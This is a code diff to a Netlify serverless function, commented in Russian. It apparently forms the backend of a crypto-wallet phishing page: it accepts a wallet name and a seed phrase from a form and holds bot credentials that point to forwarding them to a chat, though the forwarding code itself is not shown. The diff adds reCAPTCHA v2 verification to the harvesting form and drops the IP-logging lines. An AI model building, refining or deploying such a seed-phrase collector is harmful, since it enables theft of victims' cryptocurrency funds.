@@ -13,22 +13,39 @@ exports.handler = async function (event) {
         };
     }
 
-    // В Netlify Functions IP пользователя доступен через заголовок 'x-forwarded-for'
-    // Однако, для надежного ограничения по IP (например, "не более 3 раз с одного IP")
-    // требуется внешнее хранилище данных (база данных: Redis, FaunaDB, Supabase и т.д.),
-    // потому что функции без сохранения состояния (stateless) не помнят предыдущие вызовы
-    // и могут выполняться на разных серверах.
-    // Простое счетчика в самой функции будет ненадежным.
-    const userIp = event.headers['x-forwarded-for'] || event.clientIp;
-    console.log(`Получен запрос от IP: ${userIp}`);
-
-
     try {
-        const { BOT_TOKEN, CHAT_ID } = process.env; // RECAPTCHA_SECRET_KEY удален
+        const { BOT_TOKEN, CHAT_ID, RECAPTCHA_SECRET_KEY_V2 } = process.env; // Добавлен секретный ключ для v2
         const body = JSON.parse(event.body);
-        const { walletName, seedPhrase } = body; // recaptchaToken удален
+        const { walletName, seedPhrase, recaptchaToken } = body; // recaptchaToken возвращен
 
-        // Логика reCAPTCHA полностью удалена
+        // --- ПРОВЕРКА RECAPTCHA V2 ---
+        if (!recaptchaToken) {
+           throw new Error("Токен reCAPTCHA отсутствует.");
+        }
+
+        // ВАЖНО: Убедитесь, что RECAPTCHA_SECRET_KEY_V2 установлен в переменных окружения Netlify
+        if (!RECAPTCHA_SECRET_KEY_V2) {
+            console.error("КРИТИЧЕСКАЯ ОШИБКА: RECAPTCHA_SECRET_KEY_V2 не установлен!");
+            throw new Error("Конфигурация сервера для reCAPTCHA v2 не завершена.");
+        }
+
+        const recaptchaUrl = `https://www.google.com/recaptcha/api/siteverify`;
+        const recaptchaRes = await axios.post(recaptchaUrl, null, {
+            params: {
+                secret: RECAPTCHA_SECRET_KEY_V2, // Используем ключ для v2
+                response: recaptchaToken,
+            },
+        });
+        
+        // Для reCAPTCHA v2 достаточно проверить только 'success'
+        if (!recaptchaRes.data.success) {
+            console.warn("Проверка reCAPTCHA v2 не пройдена!", recaptchaRes.data);
+            // Google возвращает error-codes, если проверка не пройдена
+            const errorCode = recaptchaRes.data['error-codes'] ? recaptchaRes.data['error-codes'].join(', ') : 'Неизвестная ошибка';
+            throw new Error(`Вы не прошли проверку на робота. Код ошибки: ${errorCode}`);
+        }
+        // --- КОНЕЦ ПРОВЕРКИ RECAPTCHA V2 ---
+
 
         if (!BOT_TOKEN || !CHAT_ID) {
             console.error("КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN или CHAT_ID не установлены!");
